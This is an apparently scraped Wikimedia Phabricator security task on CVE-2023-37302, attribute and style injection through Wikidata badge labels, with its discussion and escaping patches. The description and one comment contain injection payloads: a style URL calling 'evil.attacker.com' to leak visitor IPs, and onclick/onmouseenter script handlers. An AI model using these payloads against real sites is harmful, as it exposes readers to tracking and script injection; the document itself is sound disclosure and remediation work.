=== Content from phabricator.wikimedia.org_6cf406df_20250114_195350.html ===
Page Menu[HomePhabricator](/)

* SearchConfigure Global Search

[Log In](https://phabricator.wikimedia.org/auth/start/?next=%2FT339111)[Create Task](/maniphest/task/edit/nocreate/) [Maniphest](/maniphest/)  T339111
# CVE-2023-37302: Style injection into badges on Wikidata due to unescaped quotesClosed, Resolved[Public](/policy/explain/PHID-TASK-bl4vevaswx7uccixpict/view/)5 Estimated Story PointsSecurityActions

* [Edit Task](/maniphest/task/edit/339111/)
* Edit Related Tasks...
* [Create Subtask](/maniphest/task/subtask/339111/)
* [Edit Parent Tasks](/search/rel/task.has-parent/PHID-TASK-bl4vevaswx7uccixpict/)
* [Edit Subtasks](/search/rel/task.has-subtask/PHID-TASK-bl4vevaswx7uccixpict/)
* [Merge Duplicates In](/search/rel/task.merge-in/PHID-TASK-bl4vevaswx7uccixpict/)
* [Close As Duplicate](/search/rel/task.close-as-duplicate/PHID-TASK-bl4vevaswx7uccixpict/)
* Edit Related Objects...
* [Edit Commits](/search/rel/task.has-commit/PHID-TASK-bl4vevaswx7uccixpict/)
* [Edit Mocks](/search/rel/task.has-mock/PHID-TASK-bl4vevaswx7uccixpict/)
* Subscribe
* [Mute Notifications](/subscriptions/mute/PHID-TASK-bl4vevaswx7uccixpict/)
* [Protect as security issue](/wmf/escalate-task/339111/)
* [Award Token](/token/give/PHID-TASK-bl4vevaswx7uccixpict/)
* [Flag For Later](/flag/edit/PHID-TASK-bl4vevaswx7uccixpict/)

Assigned To

|  | [Mstyles](/p/Mstyles/) |
| --- | --- |

Authored By

|  | [Michael](/p/Michael/) |
| --- | --- |
| Jun 14 2023, 11:27 AM2023-06-14 11:27:41 (UTC+0) |

Tags

* [Security-Team](/tag/security-team/) [(Our Part Is Done)](/project/board/1179/)
* [Security](/tag/security/)
* [Wikidata](/tag/wikidata/) [(incoming)](/project/board/71/)
* [Vuln-XSS](/tag/vuln-xss/)
* [Wikidata Dev Team (Sprint-∞)](/project/view/6017/) [(2023 completed tasks)](/project/board/6017/)
* [SecTeam-Processed](/tag/secteam-processed/) [(Completed)](/project/board/5180/)
Referenced Files

|  | [F37110163: 0002-SECURITY-Escape-quotes-in-js-templates.patch](/F37110163) |
| --- | --- |
| Jun 20 2023, 9:06 AM2023-06-20 09:06:22 (UTC+0) |

|  | [F37110162: 0001-SECURITY-Escape-badge-title.patch](/F37110162) |
| --- | --- |
| Jun 20 2023, 9:06 AM2023-06-20 09:06:22 (UTC+0) |

|  | [F37104972: 0001-SECURITY-Escape-quotes-in-js-templates.patch](/F37104972) |
| --- | --- |
| Jun 15 2023, 3:39 PM2023-06-15 15:39:20 (UTC+0) |

|  | [F37104690: image.png](/F37104690) |
| --- | --- |
| Jun 15 2023, 11:45 AM2023-06-15 11:45:42 (UTC+0) |

|  | [F37104687: image.png](/F37104687) |
| --- | --- |
| Jun 15 2023, 11:45 AM2023-06-15 11:45:42 (UTC+0) |

|  | [F37103609: 0001-SECURITY-Escape-badge-title.patch](/F37103609) |
| --- | --- |
| Jun 14 2023, 4:03 PM2023-06-14 16:03:20 (UTC+0) |

|  | Restricted File |
| --- | --- |
| Jun 14 2023, 3:07 PM2023-06-14 15:07:50 (UTC+0) |

Subscribers

|  | [adee\_wmde](/p/adee_wmde/) |
| --- | --- |

|  | [Aklapper](/p/Aklapper/) |
| --- | --- |

|  | [Arian\_Bozorg](/p/Arian_Bozorg/) |
| --- | --- |

|  | [daniel](/p/daniel/) |
| --- | --- |

|  | [gerritbot](/p/gerritbot/) |
| --- | --- |

|  | [Krinkle](/p/Krinkle/) |
| --- | --- |

|  | [lojo\_wmde](/p/lojo_wmde/) |
| --- | --- |

[View All 16 Subscribers](/subscriptions/list/PHID-TASK-bl4vevaswx7uccixpict/)
# Description

Steps to reproduce (preferably on a non-public wiki):

Change the Label of any Item used as a Badge (see Special:AvailableBadges) from something like Good Article to Good Article" style="display:none".

⇒ The badge is no longer visible on any Items that use it. (might need a purge or resetting the badge though)

This might leak personal data (IP-Address) to a third party by using it with a Label like Good Article" style="background-image: url(https://evil.attacker.com/transparent\_pixel.png)"

As far as I know, this is not currently being exploited. ~~Also, injecting scripts is probably not possible, because <, > and such are being escaped.~~ Injecting scripts is possible via e.g. onclick="alert(1)".

# Details

Author Affiliation Wikimedia Deutschland

|  | Subject | Repo | Branch | Lines +/- |
| --- | --- | --- | --- | --- |
|  | [SECURITY: Escape badge title](https://gerrit.wikimedia.org/r/c/933649) | [mediawiki/extensions/Wikibase](https://gerrit.wikimedia.org/r/plugins/gitiles/mediawiki/extensions/Wikibase) | [master](https://gerrit.wikimedia.org/r/plugins/gitiles/mediawiki/extensions/Wikibase/%2B/master) | +18 -3 |
|  | [SECURITY: Escape quotes in js templates](https://gerrit.wikimedia.org/r/c/933650) | [mediawiki/extensions/Wikibase](https://gerrit.wikimedia.org/r/plugins/gitiles/mediawiki/extensions/Wikibase) | [master](https://gerrit.wikimedia.org/r/plugins/gitiles/mediawiki/extensions/Wikibase/%2B/master) | +12 -5 |

[Customize query in gerrit](https://gerrit.wikimedia.org/r/#/q/bug:T339111)
# Related Objects

* Mentions

Mentioned In [T340874: Write and send supplementary release announcement for extensions and skins with security patches (1.35.12/1.39.5/1.40.1)](/T340874)
[T91067: Port wikibase templates to Mustache](/T91067)
[T333626: Write and send supplementary release announcement for extensions and skins with security patches (1.35.11/1.38.7/1.39.4/1.40.0)](/T333626) Mentioned Here [T91067: Port wikibase templates to Mustache](/T91067)
[T333626: Write and send supplementary release announcement for extensions and skins with security patches (1.35.11/1.38.7/1.39.4/1.40.0)](/T333626)
[T339260: CVE-2023-45366: FederatedPropertiesError shows label as unescaped HTML](/T339260)
[T44956: Javascript error in wd.template when language is set to French](/T44956)
[T250720: CVE-2023-37301: Wikidata edit filter does not fire when test tool says it should](/T250720)
### Event Timeline

[Michael](/p/Michael/) created this task.[Jun 14 2023, 11:27 AM2023-06-14 11:27:41 (UTC+0)](#8931032)Restricted Application added a subscriber: [Aklapper](/p/Aklapper/).  · [View Herald Transcript](/herald/transcript/5411528/)[Jun 14 2023, 11:27 AM2023-06-14 11:27:42 (UTC+0)](#8931043)[Michael](/p/Michael/) added a project: [Wikidata](/tag/wikidata/).[Jun 14 2023, 11:28 AM2023-06-14 11:28:04 (UTC+0)](#8931045)[Michael](/p/Michael/) added subscribers: [Arian\_Bozorg](/p/Arian_Bozorg/), [Lydia\_Pintscher](/p/Lydia_Pintscher/).[Jun 14 2023, 11:51 AM2023-06-14 11:51:52 (UTC+0)](#8931174)[Lucas\_Werkmeister\_WMDE](/p/Lucas_Werkmeister_WMDE/) updated the task description. [(Show Details)](/transactions/detail/PHID-XACT-TASK-2b2i3zdv2ldxfea/)[Jun 14 2023, 1:15 PM2023-06-14 13:15:33 (UTC+0)](#8931466)[Lucas\_Werkmeister\_WMDE](/p/Lucas_Werkmeister_WMDE/) updated the task description. [(Show Details)](/transactions/detail/PHID-XACT-TASK-oaxly65mdcox54d/)

[Lucas\_Werkmeister\_WMDE](/p/Lucas_Werkmeister_WMDE/) updated the task description. [(Show Details)](/transactions/detail/PHID-XACT-TASK-z3qmwll6hgsl3hn/)[Jun 14 2023, 1:19 PM2023-06-14 13:19:28 (UTC+0)](#8931479)[Lucas\_Werkmeister\_WMDE](/p/Lucas_Werkmeister_WMDE/) added a project: [Vuln-XSS](/tag/vuln-xss/).[Lucas\_Werkmeister\_WMDE](/p/Lucas_Werkmeister_WMDE/) subscribed.Comment Actions

Note: most of Wikidata’s badge items are *not* protected at all. (I would’ve expected all of them to have at least some weak page protection, to be honest.)

[sbassett](/p/sbassett/) subscribed.[Jun 14 2023, 2:47 PM2023-06-14 14:47:10 (UTC+0)](#8931909)Comment Actions

Not sure at what layer this needs to happen, but I would assume a simple call to Sanitizer::safeEncodeAttribute() or even htmlentities( $badgeLabelText, ENT\_QUOTES ) would be all that was needed here?

[Lucas\_Werkmeister\_WMDE](/p/Lucas_Werkmeister_WMDE/) added a comment.[Jun 14 2023, 2:49 PM2023-06-14 14:49:22 (UTC+0)](#8931914)Comment Actions

Yeah, I expect the fix will be simple, we just need to find the code in Wikibase.

[Lucas\_Werkmeister\_WMDE](/p/Lucas_Werkmeister_WMDE/) added a comment.Edited · [Jun 14 2023, 2:52 PM2023-06-14 14:52:23 (UTC+0)](#8931931)Comment Actions

This seems to do the trick:

```
diff --git a/view/src/SiteLinksView.php b/view/src/SiteLinksView.php
index 5864120618..249313783e 100644
--- a/view/src/SiteLinksView.php
+++ b/view/src/SiteLinksView.php
@@ -351,18 +351,18 @@ private function getHtmlForBadges( array $badges ) {
 		foreach ( $badges as $badge ) {
 			$serialization = $badge->getSerialization();
 			$classes = Sanitizer::escapeClass( $serialization );
 			if ( !empty( $this->badgeItems[$serialization] ) ) {
 				$classes .= ' ' . Sanitizer::escapeClass( $this->badgeItems[$serialization] );
 			}

 			$html .= $this->templateFactory->render( 'wb-badge',
 				$classes,
-				$this->entityIdFormatter->formatEntityId( $badge ),
+				Sanitizer::safeEncodeAttribute( $this->entityIdFormatter->formatEntityId( $badge ) ),
 				$badge
 			);
 		}

 		return $this->templateFactory->render( 'wikibase-badgeselector', $html );
 	}

 }
```

I’ll try to put together a test as well. And thanks for the pointer to Sanitizer::safeEncodeAttribute(), I didn’t know that method.

[Lucas\_Werkmeister\_WMDE](/p/Lucas_Werkmeister_WMDE/) added a project: [Wikidata Dev Team (Sprint-∞)](/project/view/6017/).[Jun 14 2023, 3:07 PM2023-06-14 15:07:50 (UTC+0)](#8931955)Comment Actions

Patch with test added:

{F37103553}

[Lucas\_Werkmeister\_WMDE](/p/Lucas_Werkmeister_WMDE/) moved this task from [Parents/Waiting](/project/board/6017/) to [Peer Review](/project/board/6017/) on the [Wikidata Dev Team (Sprint-∞)](/project/view/6017/) board.[Jun 14 2023, 3:08 PM2023-06-14 15:08:34 (UTC+0)](#8931970)

[Lucas\_Werkmeister\_WMDE](/p/Lucas_Werkmeister_WMDE/) added a comment.[Jun 14 2023, 4:03 PM2023-06-14 16:03:20 (UTC+0)](#8932224)Comment Actions

Same patch but this time with perhaps better permissions (I think I accidentally attached the previous file to [T250720](/T250720) instead of this task):

0001-SECURITY-Escape-badge-title.patch3 KB[Download](https://phab.wmfusercontent.org/file/download/c2qqvvsr2mrqva4sfrjl/PHID-FILE-rtith7ya6wopglhvwtam/0001-SECURITY-Escape-badge-title.patch)

[Lucas\_Werkmeister\_WMDE](/p/Lucas_Werkmeister_WMDE/) added a comment.[Jun 15 2023, 11:45 AM2023-06-15 11:45:42 (UTC+0)](#8934513)Comment Actions

The patch isn’t enough, [@Michael](/p/Michael/) found another place that is missing escaping when editing badges:

[![image.png (99×558 px, 9 KB)](https://phab.wmfusercontent.org/file/data/4sxceuevnzafdubmiwsm/PHID-FILE-uky7j3qfcqyeojwsg3mq/preview-image.png)](https://phab.wmfusercontent.org/file/data/ipqy4cm57znvqqyfrnxy/PHID-FILE-b6bp4ggtkd54vdh27tka/image.png)

I can’t seem to trigger the onmouseenter= handler in this case (probably because the element in question has 0 width?), but the style injection is still a problem.

Also, when a sitelink doesn’t have a badge yet, it uses an empty badge as a button:

[![image.png (66×366 px, 7 KB)](https://phab.wmfusercontent.org/file/data/qh2rvmlokn3olr3ti6nh/PHID-FILE-zzu46lyx5e4uafhb6n5i/preview-image.png)](https://phab.wmfusercontent.org/file/data/zu5ivc6vhbeormeuzbl4/PHID-FILE-x3qjqmlnjrkmkxo33ffd/image.png)

This button has an i18n message as the title= (wikibase-badgeselector-badge-placeholder-title), and that message also isn’t escaped, so if you set it to e.g. Click to assign a badge." onmouseenter="alert('i18n xss') then you have another HTML injection.

[Michael](/p/Michael/) added a comment.Edited · [Jun 15 2023, 12:54 PM2023-06-15 12:54:49 (UTC+0)](#8934714)Comment Actions

I think this is the 10.5-year-old change that introduced the js issues: [https://gerrit.wikimedia.org/r/c/mediawiki/extensions/Wikibase/+/38288](https://gerrit.wikimedia.org/r/c/mediawiki/extensions/Wikibase/%2B/38288)

I'm still trying to wrap my head around what problem it tried to actually fix.

Ah, gotcha: [T44956](/T44956)

[Michael](/p/Michael/) added a comment.[Jun 15 2023, 3:39 PM2023-06-15 15:39:20 (UTC+0)](#8935513)Comment Actions

The following change complements the change [@Lucas\_Werkmeister\_WMDE](/p/Lucas_Werkmeister_WMDE/) shared above. It should fix the other places about badges mentioned in [T339111#8934513](/T339111#8934513), though I have not yet looked into the i18n issue mentioned there.

0001-SECURITY-Escape-quotes-in-js-templates.patch2 KB[Download](https://phab.wmfusercontent.org/file/download/shbxa6yxjxq5ov46jxxx/PHID-FILE-knkugeaqfjxve2hwlb73/0001-SECURITY-Escape-quotes-in-js-templates.patch)

However, this change modifies code that was last touched/written a decade ago and is used in *a lot* of code paths in Wikibases legacy js code. I think it would be great if that could get a second and maybe third look.

Also, we should probably be extra on the lookout for community members reporting problems with the js/editing functionality on Item/Property(/Lexeme?) pages.

[sbassett](/p/sbassett/) moved this task from [Incoming](/project/board/1179/) to [Security Patch To Deploy](/project/board/1179/) on the [Security-Team](/tag/security-team/) board.[Jun 15 2023, 8:24 PM2023-06-15 20:24:57 (UTC+0)](#8936683)Comment Actions
> In [T339111#8935513](/T339111#8935513), [@Michael](/p/Michael/) wrote:
>
> The following change complements the change [@Lucas\_Werkmeister\_WMDE](/p/Lucas_Werkmeister_WMDE/) shared above. It should fix the other places about badges mentioned in [T339111#8934513](/T339111#8934513), though I have not yet looked into the i18n issue mentioned there.

Complements as in should be applied as a second patch dependent upon the refactor from [T339111#8932224](/T339111#8932224)?

> However, this change modifies code that was last touched/written a decade ago and is used in *a lot* of code paths in Wikibases legacy js code. I think it would be great if that could get a second and maybe third look.

Any other folks from [the git history](https://github.com/wikimedia/mediawiki-extensions-Wikibase/graphs/contributors), etc. who we could sub to this task?

> Also, we should probably be extra on the lookout for community members reporting problems with the js/editing functionality on Item/Property(/Lexeme?) pages.

Once the patch(es) are deployed to Wikimedia production, we could make this task public since Wikibase isn't bundled with the MediaWiki core releases.

[Lucas\_Werkmeister\_WMDE](/p/Lucas_Werkmeister_WMDE/) added subscribers: [thiemowmde](/p/thiemowmde/), [Krinkle](/p/Krinkle/).[Jun 16 2023, 10:22 AM2023-06-16 10:22:17 (UTC+0)](#8938394)Comment Actions
> In [T339111#8935513](/T339111#8935513), [@Michael](/p/Michael/) wrote:
>
> The following change complements the change [@Lucas\_Werkmeister\_WMDE](/p/Lucas_Werkmeister_WMDE/) shared above. It should fix the other places about badges mentioned in [T339111#8934513](/T339111#8934513), though I have not yet looked into the i18n issue mentioned there.
>
> 0001-SECURITY-Escape-quotes-in-js-templates.patch2 KB[Download](https://phab.wmfusercontent.org/file/download/shbxa6yxjxq5ov46jxxx/PHID-FILE-knkugeaqfjxve2hwlb73/0001-SECURITY-Escape-quotes-in-js-templates.patch)

LGTM, +1. I can confirm it also fixes the i18n issue I found.

> In [T339111#8936683](/T339111#8936683), [@sbassett](/p/sbassett/) wrote:
>
> Complements as in should be applied as a second patch dependent upon the refactor from [T339111#8932224](/T339111#8932224)?

Yes, both should be applied. And while they could be squashed into one, to me they look separate enough that I think it also makes sense to keep them separate, if that’s okay with you.

> > However, this change modifies code that was last touched/written a decade ago and is used in *a lot* of code paths in Wikibases legacy js code. I think it would be great if that could get a second and maybe third look.
>
> Any other folks from [the git history](https://github.com/wikimedia/mediawiki-extensions-Wikibase/graphs/contributors), etc. who we could sub to this task?

git shortlog -- lib/resources/templates.js repo/resources/templates.js view/resources/wikibase/templates.js has a lot of people who are no longer with us :/ but CC [@thiemowmde](/p/thiemowmde/) and [@Krinkle](/p/Krinkle/) who made nontrivial changes.

[thiemowmde](/p/thiemowmde/) added a comment.[Jun 16 2023, 12:49 PM2023-06-16 12:49:37 (UTC+0)](#8938620)Comment Actions

Sorry, I think I can't help. I joined February 2014. But this here is quite a bit older.

I kind of remember poking at this custom template system. I always wondered why it's even necessary. At one point I even tried to get rid of it: <https://gerrit.wikimedia.org/r/252008>. Unfortunately that never happened.

[Michael](/p/Michael/) added subscribers: [daniel](/p/daniel/), [Tobi\_WMDE\_SW](/p/Tobi_WMDE_SW/).[Jun 16 2023, 2:33 PM2023-06-16 14:33:30 (UTC+0)](#8938893)Comment Actions

I think back then [@Tobi\_WMDE\_SW](/p/Tobi_WMDE_SW/) and [@daniel](/p/daniel/) were around, though maybe not working on that particular part of the code. But maybe looking at the changes, especially the Javascript one, does trigger any memories or immediate thoughts?

[Lucas\_Werkmeister\_WMDE](/p/Lucas_Werkmeister_WMDE/) added a comment.[Jun 19 2023, 1:55 PM2023-06-19 13:55:29 (UTC+0)](#8946810)Comment Actions

FTR, I plan to deploy both fixes tomorrow (today’s supposedly a no-deploy day, though there’s some confusion about that) unless I hear any objections.

[Krinkle](/p/Krinkle/) added a comment.Edited · [Jun 19 2023, 2:34 PM2023-06-19 14:34:57 (UTC+0)](#8946884)Comment Actions
> In [T339111#8931931](/T339111#8931931), [@Lucas\_Werkmeister\_WMDE](/p/Lucas_Werkmeister_WMDE/) wrote:
>
> This seems to do the trick:
>
> ```
> diff --git a/view/src/SiteLinksView.php b/view/src/SiteLinksView.php
> index 5864120618..249313783e 100644
> --- a/view/src/SiteLinksView.php
> +++ b/view/src/SiteLinksView.php
> @@ -351,18 +351,18 @@ private function getHtmlForBadges( array $badges ) {
>  		foreach ( $badges as $badge ) {
>  			$serialization = $badge->getSerialization();
>  			$classes = Sanitizer::escapeClass( $serialization );
>  			if ( !empty( $this->badgeItems[$serialization] ) ) {
>  				$classes .= ' ' . Sanitizer::escapeClass( $this->badgeItems[$serialization] );
>  			}
>
>  			$html .= $this->templateFactory->render( 'wb-badge',
>  				$classes,
> -				$this->entityIdFormatter->formatEntityId( $badge ),
> +				Sanitizer::safeEncodeAttribute( $this->entityIdFormatter->formatEntityId( $badge ) ),
>  				$badge
>  			);
>  		}
>
>  		return $this->templateFactory->render( 'wikibase-badgeselector', $html );
>  	}
>
>  }
> ```
>
> I’ll try to put together a test as well. And thanks for the pointer to Sanitizer::safeEncodeAttribute(), I didn’t know that method.

Is the result of this rendered HTML template at some point passed to a wikitext parser?

If not, I suggest using htmlspecialchars and not Sanitizer::safeEncodeAttribute as the latter is very specific to escaping user input for use in wikitext Parser context. For example, it escapes underscores and slashes that have no meaning in HTML, but would otherwise produce magic words, and anchor tags for bare URLs, etc.

Or better yet, update the Mustache template to use {{ instead of {{{ as it should not be rendering this as raw HTML in the first place.

It maybe be prudent to audit the other Wikibase HTML templates and confirm they also don't place any text as raw HTML.

[Lucas\_Werkmeister\_WMDE](/p/Lucas_Werkmeister_WMDE/) added a comment.[Jun 20 2023, 9:06 AM2023-06-20 09:06:22 (UTC+0)](#8948079)Comment Actions
> In [T339111#8946884](/T339111#8946884), [@Krinkle](/p/Krinkle/) wrote:
>
> Is the result of this rendered HTML template at some point passed to a wikitext parser?

Doesn’t look like it, it goes into ParserOutput::setText() (very confusingly named, but takes HTML) in FullEntityParserOutputGenerator, and into OutputPage::addHTML() in WikibaseMediaInfoHooks.

> If not, I suggest using htmlspecialchars and not Sanitizer::safeEncodeAttribute as the latter is very specific to escaping user input for use in wikitext Parser context. For example, it escapes underscores and slashes that have no meaning in HTML, but would otherwise produce magic words, and anchor tags for bare URLs, etc.

Okay, new patches:

0001-SECURITY-Escape-badge-title.patch3 KB[Download](https://phab.wmfusercontent.org/file/download/hdq5ecf43ukpz4mwgnvz/PHID-FILE-5657tebv5fcvpu6c6vh5/0001-SECURITY-Escape-badge-title.patch)

0002-SECURITY-Escape-quotes-in-js-templates.patch2 KB[Download](https://phab.wmfusercontent.org/file/download/wiw3k7piqlptcojrhsjn/PHID-FILE-q5vukvygduzr5m7zgwg7/0002-SECURITY-Escape-quotes-in-js-templates.patch)

I also ran the repo/ and view/ tests again and they still pass.

> Or better yet, update the Mustache template to use {{ instead of {{{ as it should not be rendering this as raw HTML in the first place.

It’s not a Mustache template, it’s a Wikibase-specific thing, predating Mustache support in core by a few years. (It’s actually implemented based on Message, but bypassing almost all Message functionality – AFAICT there’s little reason why we don’t just replace $1, $2 etc. directly.) Replacing it with Mustache might be a good idea (we need to process these templates server- and client-side, and MediaWiki gives us that), but that should be done outside of a security task.

> It maybe be prudent to audit the other Wikibase HTML templates and confirm they also don't place any text as raw HTML.

I did that, [T339260](/T339260) was the only other issue I found.

[Lucas\_Werkmeister\_WMDE](/p/Lucas_Werkmeister_WMDE/) added a comment.[Jun 20 2023, 10:18 AM2023-06-20 10:18:49 (UTC+0)](#8948286)Comment Actions

Patches deployed to wmf.13. (I skipped wmf.12 because the train is already done; wmf.14 doesn’t exist yet on deploy1002.) I don’t think we can really test that the issue doesn’t occur on production without making it quite obvious (since the badge items are reasonably prominent); let’s just hope that it’s fixed now, I think. (And if we hear any user reports about errors that might be due to the changed templating in JS, investigate those.)

[Lucas\_Werkmeister\_WMDE](/p/Lucas_Werkmeister_WMDE/) moved this task from [Peer Review](/project/board/6017/) to [Our work done](/project/board/6017/) on the [Wikidata Dev Team (Sprint-∞)](/project/view/6017/) board.[Jun 20 2023, 3:22 PM2023-06-20 15:22:02 (UTC+0)](#8949374)

[Lucas\_Werkmeister\_WMDE](/p/Lucas_Werkmeister_WMDE/) added a comment.[Jun 20 2023, 3:35 PM2023-06-20 15:35:50 (UTC+0)](#8949436)Comment Actions
> It’s not a Mustache template, it’s a Wikibase-specific thing, predating Mustache support in core by a few years. (It’s actually implemented based on Message, but bypassing almost all Message functionality – AFAICT there’s little reason why we don’t just replace $1, $2 etc. directly.) Replacing it with Mustache might be a good idea (we need to process these templates server- and client-side, and MediaWiki gives us that), but that should be done outside of a security task.

I put together a quick proof of concept for decoupling Wikibase’s Template class from core’s Message, and it seems to work well enough in local testing. I’ll push it for CI checks once this task is public. (Migrating to Mustache needs a bit more work because it’ll require updating all the templates.)

[sbassett](/p/sbassett/) mentioned this in [T333626: Write and send supplementary release announcement for extensions and skins with security patches (1.35.11/1.38.7/1.39.4/1.40.0)](/T333626).[Jun 20 2023, 5:17 PM2023-06-20 17:17:46 (UTC+0)](#8950147)[sbassett](/p/sbassett/) changed the task status from Open to In Progress.[Jun 20 2023, 5:20 PM2023-06-20 17:20:19 (UTC+0)](#8950152)[sbassett](/p/sbassett/) triaged this task as High priority.[sbassett](/p/sbassett/) moved this task from [Security Patch To Deploy](/project/board/1179/) to [Watching](/project/board/1179/) on the [Security-Team](/tag/security-team/) board.[sbassett](/p/sbassett/) added a project: [SecTeam-Processed](/tag/secteam-processed/).Comment Actions
> In [T339111#8948286](/T339111#8948286), [@Lucas\_Werkmeister\_WMDE](/p/Lucas_Werkmeister_WMDE/) wrote:
>
> Patches deployed to wmf.13. (I skipped wmf.12 because the train is already done; wmf.14 doesn’t exist yet on deploy1002.) I don’t think we can really test that the issue doesn’t occur on production without making it quite obvious (since the badge items are reasonably prominent); let’s just hope that it’s fixed now, I think. (And if we hear any user reports about errors that might be due to the changed templating in JS, investigate those.)

Thanks for the patches and deploy! Now also tracking at T276237 and for the next supplemental release [T333626](/T333626).

[Tarrow](/p/Tarrow/) added subscribers: [roti\_WMDE](/p/roti_WMDE/), [adee\_wmde](/p/adee_wmde/), [lojo\_wmde](/p/lojo_wmde/), [Tarrow](/p/Tarrow/).[Jun 23 2023, 9:13 AM2023-06-23 09:13:29 (UTC+0)](#8958044)Comment Actions

[@roti\_WMDE](/p/roti_WMDE/) [@adee\_wmde](/p/adee_wmde/) [@lojo\_wmde](/p/lojo_wmde/) FYI when considering the next security release of Wikibase

[Mstyles](/p/Mstyles/) added a subscriber: [gerritbot](/p/gerritbot/).[Jun 27 2023, 8:57 PM2023-06-27 20:57:03 (UTC+0)](#8969592)[Mstyles](/p/Mstyles/) subscribed.[Jun 27 2023, 10:50 PM2023-06-27 22:50:12 (UTC+0)](#8969994)Comment Actions

[@Tarrow](/p/Tarrow/) is there a list of Wikibase versions you could point me towards?

[roti\_WMDE](/p/roti_WMDE/) added a comment.[Jun 28 2023, 5:54 AM2023-06-28 05:54:19 (UTC+0)](#8970375)Comment Actions

[@Mstyles](/p/Mstyles/) Wikibase versions are currently described in <https://github.com/wmde/wikibase-release-pipeline/blob/main/CHANGES.md>

[karapayneWMDE](/p/karapayneWMDE/) set the point value for this task to 5.[Jun 28 2023, 8:29 AM2023-06-28 08:29:24 (UTC+0)](#8970606)[karapayneWMDE](/p/karapayneWMDE/) moved this task from [Our work done](/project/board/6017/) to [2023 completed tasks](/project/board/6017/) on the [Wikidata Dev Team (Sprint-∞)](/project/view/6017/) board.[Jun 28 2023, 8:55 AM2023-06-28 08:55:04 (UTC+0)](#8970786)[gerritbot](/p/gerritbot/) added a comment.[Jun 28 2023, 10:50 AM2023-06-28 10:50:38 (UTC+0)](#8971129)Comment Actions

Change 933649 **merged** by jenkins-bot:

[mediawiki/extensions/Wikibase@master] SECURITY: Escape badge title

<https://gerrit.wikimedia.org/r/933649>

[gerritbot](/p/gerritbot/) added a comment.[Jun 28 2023, 10:50 AM2023-06-28 10:50:44 (UTC+0)](#8971130)Comment Actions

Change 933650 **merged** by jenkins-bot:

[mediawiki/extensions/Wikibase@master] SECURITY: Escape quotes in js templates

<https://gerrit.wikimedia.org/r/933650>

[sbassett](/p/sbassett/) added a comment.[Jun 28 2023, 2:53 PM2023-06-28 14:53:53 (UTC+0)](#8973730)Comment Actions
> In [T339111#8969994](/T339111#8969994), [@Mstyles](/p/Mstyles/) wrote:
>
> [@Tarrow](/p/Tarrow/) is there a list of Wikibase versions you could point me towards?

For the upcoming supplemental release, I think we'll only need to care about [currently supported versions of MediaWiki](https://www.mediawiki.org/wiki/Version_lifecycle#Versions_and_their_end-of-life) for Wikibase.

[Mstyles](/p/Mstyles/) renamed this task from Style injection into badges on Wikidata due to unescaped quotes to CVE-2023-37302: Style injection into badges on Wikidata due to unescaped quotes.[Jun 30 2023, 5:50 PM2023-06-30 17:50:22 (UTC+0)](#8982294)[Mstyles](/p/Mstyles/) closed this task as Resolved.[Mstyles](/p/Mstyles/) claimed this task.[Mstyles](/p/Mstyles/) changed the visibility from "[Custom Policy](/transactions/old/PHID-XACT-TASK-xk3jyoiaqhiaks2/)" to "Public (No Login Required)".[Mstyles](/p/Mstyles/) changed the edit policy from "[Custom Policy](/transactions/old/PHID-XACT-TASK-gurwg2vqemtftoe/)" to "All Users".[Mstyles](/p/Mstyles/) moved this task from [Watching](/project/board/1179/) to [Our Part Is Done](/project/board/1179/) on the [Security-Team](/tag/security-team/) board.[Jun 30 2023, 5:56 PM2023-06-30 17:56:36 (UTC+0)](#8982459)

[Lucas\_Werkmeister\_WMDE](/p/Lucas_Werkmeister_WMDE/) added a comment.[Jul 3 2023, 9:41 AM2023-07-03 09:41:08 (UTC+0)](#8984772)Comment Actions
> In [T339111#8949436](/T339111#8949436), [@Lucas\_Werkmeister\_WMDE](/p/Lucas_Werkmeister_WMDE/) wrote:
> > It’s not a Mustache template, it’s a Wikibase-specific thing, predating Mustache support in core by a few years. (It’s actually implemented based on Message, but bypassing almost all Message functionality – AFAICT there’s little reason why we don’t just replace $1, $2 etc. directly.) Replacing it with Mustache might be a good idea (we need to process these templates server- and client-side, and MediaWiki gives us that), but that should be done outside of a security task.
>
> I put together a quick proof of concept for decoupling Wikibase’s Template class from core’s Message, and it seems to work well enough in local testing. I’ll push it for CI checks once this task is public. (Migrating to Mustache needs a bit more work because it’ll require updating all the templates.)

⇒ [POC: Decouple Template from Message](https://gerrit.wikimedia.org/r/c/mediawiki/extensions/Wikibase/%2B/935001)

[Lucas\_Werkmeister\_WMDE](/p/Lucas_Werkmeister_WMDE/) mentioned this in [T91067: Port wikibase templates to Mustache](/T91067).[Jul 3 2023, 9:50 AM2023-07-03 09:50:12 (UTC+0)](#8984818)Comment Actions

Also, it turns out we’ve wanted to move to Mustache for a long time already (but never prioritized it): [T91067: Port wikibase templates to Mustache](/T91067)

[sbassett](/p/sbassett/) mentioned this in [T340874: Write and send supplementary release announcement for extensions and skins with security patches (1.35.12/1.39.5/1.40.1)](/T340874).[Jul 6 2023, 3:27 PM2023-07-06 15:27:54 (UTC+0)](#8994368)Content licensed under Creative Commons Attribution-ShareAlike (CC BY-SA) 4.0 unless otherwise noted; code licensed under GNU General Public License (GPL) 2.0 or later and other open source licenses. By using this site, you agree to the Terms of Use, Privacy Policy, and Code of Conduct. · [Wikimedia Foundation](https://wikimediafoundation.org/) · [Privacy Policy](https://foundation.wikimedia.org/wiki/Special%3AMyLanguage/Policy%3ANon-wiki_privacy_policy) · [Code of Conduct](https://www.mediawiki.org/wiki/Special%3AMyLanguage/Code_of_Conduct) · [Terms of Use](https://foundation.wikimedia.org/wiki/Special%3AMyLanguage/Policy%3ATerms_of_Use/Phabricator) · [Disclaimer](https://foundation.wikimedia.org/wiki/Special%3AMyLanguage/Policy%3AGeneral_disclaimer) · [CC-BY-SA](https://creativecommons.org/licenses/by-sa/4.0/) · [GPL](https://www.gnu.org/licenses/old-licenses/gpl-2.0.html) · [Credits](https://www.mediawiki.org/wiki/Phabricator/Credits)

=== Content from gerrit.wikimedia.org_1d71b740_20250114_195347.html ===




=== Content from gerrit.wikimedia.org_ac7a0e98_20250114_195348.html ===



